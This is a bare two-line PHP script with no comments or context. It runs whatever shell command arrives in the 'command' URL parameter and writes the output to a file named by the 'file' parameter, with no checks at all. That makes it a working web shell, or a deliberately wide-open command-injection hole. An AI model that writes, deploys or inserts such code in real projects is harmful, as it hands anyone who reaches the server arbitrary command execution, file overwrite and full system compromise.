<?php

exec($_GET['command'] . " > generatedFiles/" . $_GET['file']);